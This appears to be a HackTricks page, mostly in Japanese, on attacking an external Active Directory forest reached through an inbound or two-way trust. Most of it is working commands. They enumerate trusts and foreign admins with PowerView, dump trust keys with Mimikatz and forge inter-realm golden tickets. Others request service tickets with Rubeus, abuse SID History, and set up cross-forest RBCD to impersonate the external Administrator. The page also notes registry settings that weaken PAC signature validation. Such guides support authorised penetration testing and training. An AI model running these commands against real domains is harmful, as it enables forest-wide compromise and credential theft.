# 外部フォレストドメイン - OneWay (Inbound) または 双方向

{{#include ../../banners/hacktricks-training.md}}

このシナリオでは、外部ドメインがあなたを信頼している（または双方が相互に信頼している）ため、そのドメインに対して何らかのアクセスが可能になります。

## 列挙

まずは、**信頼**を**列挙**することが必要です：
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` は、追加の前提条件なしにクロスフォレストの悪用パス（RBCD、SIDHistory）が有効かどうかを素早く確認できます。

In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.

## 初期アクセス

もし他ドメインで自分のユーザーに対して何か**特別な**アクセスを見つけられなかった場合でも、AD Methodology に戻って、**privesc from an unprivileged user**（例えば kerberoasting のような手法）を試すことができます：

You can use **Powerview functions** to **enumerate** the **other domain** using the `-Domain` param like in:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## なりすまし

### ログイン

外部ドメインにアクセス権を持つユーザーの資格情報を使用して通常の方法でログインすれば、以下にアクセスできるはずです:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History の悪用

フォレストトラストを横断して[**SID History**](sid-history-injection.md)を悪用することもできます。

ユーザーが**あるフォレストから別のフォレストへ移行**され、かつ**SID Filteringが有効になっていない**場合、他のフォレストの**SIDを追加**できるようになり、この**SID**はトラストを介して認証する際に**ユーザーのトークン**に**追加**されます。

> [!WARNING]
> 補足として、署名キーは次のコマンドで取得できます
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

現在のドメインのユーザーをインパーソネートする**TGT**に、**trusted**キーで**署名する**ことができます。
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### ユーザーを完全になりすます方法
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD 信頼フォレストでマシンアカウントを制御している場合 (no SID filtering / selective auth)

もしあなたの foreign principal (FSP) が信頼フォレスト内でコンピュータオブジェクトを書き込めるグループ（例: `Account Operators`、カスタムプロビジョニンググループ）に入ると、当該フォレストのターゲットホストで **Resource-Based Constrained Delegation** を設定し、そこで任意のユーザーになりすますことができます:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
これは **SelectiveAuthentication is disabled** かつ **SID filtering** があなたの制御する SID を削除しない場合にのみ機能します。SIDHistory forging を回避する高速な横移動経路で、トラストレビューで見落とされることが多いです。

### PAC 検証の強化

PAC署名検証の更新（**CVE-2024-26248**/**CVE-2024-29056**）により、inter-forest チケットで署名の強制が追加されます。**Compatibility mode** では、偽造された inter-realm PAC/SIDHistory/S4U パスが未パッチの DCs で依然として動作することがあります。**Enforcement mode** では、unsigned または改ざんされた PAC データが forest trust を越えて渡ると拒否されます（対象フォレストのトラストキーを所有している場合を除く）。レジストリオーバーライド（`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`）が利用可能な間はこれを弱めることができます。



## 参考資料

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
